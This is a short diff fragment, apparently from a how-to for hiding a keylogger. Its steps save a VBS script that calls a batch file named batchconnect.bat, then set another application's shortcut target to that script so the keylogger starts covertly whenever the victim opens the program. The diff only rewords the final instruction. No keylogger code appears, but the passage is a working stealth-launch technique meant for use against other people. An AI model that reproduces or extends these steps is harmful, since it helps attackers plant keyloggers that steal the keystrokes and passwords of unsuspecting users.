@@ -14,4 +14,4 @@ Set WshShell = Nothing
 
 change the c:\ path to the batchconnect.bat path save the document as .vbs 
 
-right click the application you bound to your keylogger click settings then shortcuts then target and then you copy paste your vbs path in there 
+right click the application you bound to your keylogger click settings then shortcuts then target and then paste the .vbs path
